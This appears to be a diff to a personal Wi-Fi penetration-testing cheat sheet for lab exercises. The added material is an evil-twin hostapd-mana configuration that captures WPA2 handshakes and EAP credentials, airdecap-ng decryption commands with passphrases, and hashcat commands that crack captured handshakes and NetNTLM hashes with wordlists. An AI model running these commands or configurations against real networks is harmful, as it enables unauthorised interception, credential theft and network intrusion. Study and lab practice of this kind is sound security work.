@@ -299,7 +299,7 @@ ip link set wlan0 up
     network={
       ssid="<Your_SSID>"
       key_mgmt=NONE
-      wep_key0=hex_password
+      wep_key0=hex_password_no_colons
       wep_tx_keyidx=0
     }
     
@@ -385,8 +385,23 @@ ip link set wlan0 up
 ## 7. Hostapd-mana
 
 * ```bash
+  #####HOSTAPD.CONF######
+  # Interface configuration for WPA2
+  interface=wlan1
+  driver=nl80211
+  hw_mode=g
+  channel=1
+  ssid=wifi-offices
+  mana_wpaout=hostapd.hccapx
+  wpa=2
+  wpa_key_mgmt=WPA-PSK
+  wpa_pairwise=TKIP CCMP
+  wpa_passphrase=12345678
+  ```
+
+* ```bash
   #### HOSTAPD.CONF######
-  # Interface configuration
+  # Interface configuration for WPA-MGT
   interface=wlan1
   ssid=ENTER_SSID_HERE
   channel=1
@@ -422,6 +437,11 @@ ip link set wlan0 up
   ####hostapd.eap_user#####
   * TTLS,PEAP,TLS,MD5,GTC,FAST
   "t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "challenge1234" [2]
+  ```
+
+* ```bash
+  #launch hostapd mana specifically
+  hostapd-mana hostapd.conf
   ```
 
 ## 8. OpenSSL
@@ -470,6 +490,24 @@ wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
 MANA EAP Identity Phase 1: HTB\Sentinal.Jr
 MANA EAP EAP-MSCHAPV2 ASLEAP user=Sentinal.Jr | asleap -C b5:13:4f:4e:e1:93:f4:98 -R 32:28:b5:61:21:4b:35:fe:55:bc:61:eb:bd:b2:a1:4b:3f:79:4d:87:e6:88:e3:ff
 ```
+
+## 10. Airdecap
+
+Airdecap-ng : Checking your password against a pcap
+
+```bash
+airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
+
+airdecap-ng -b 76:5C:7F:17:C6:26 -e Hodept-working-horse -p Juniper5968265$ working-01.cap 
+```
+
+If you were disrupted while performing the capture, you can also attempt to check your attack via Wireshark: `wireshark example.cap` `edit > preferences > protocols > IEEE 802.11 Wireless LAN > keys > WPA-pwd`
+
+After entering the key you should see that the packets are then decrypted and view able as they were not before.
+
+
+
+
 
   --------
 
@@ -537,6 +575,7 @@ hashcat -m 2500 --deprecated-check-disable output.hccapx
 
 # hashcat mode 22000
 hashcat -a 0 -m  {22000 or 2500}  hash.hc22000 /usr/share/john/password.lst
+hashcat -a 0 -m 22000 hostapd.hccapx ~/rockyou-top100000.txt --force
 
 hcxpcapngtool -o hash.hc22000 Lab210-01.cap
 hashcat -a 0 -m 22000 hash.hc22000 /usr/shar/wordlist/rockyou.txt
@@ -557,6 +596,9 @@ hashcat -m 16800 pmkid.16800 wordlist.txt
 # Run with hashcat
 hashcat -m 5500 hash.txt wordlist.txt
 hashcat -m 5500 hash.txt wordlist.txt --show
+
+#run with full output already 
+hashcat -m 5500 -a 0 HTB-NET\Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s wordlist.dict
 ```
 
 ## D. T-Shark
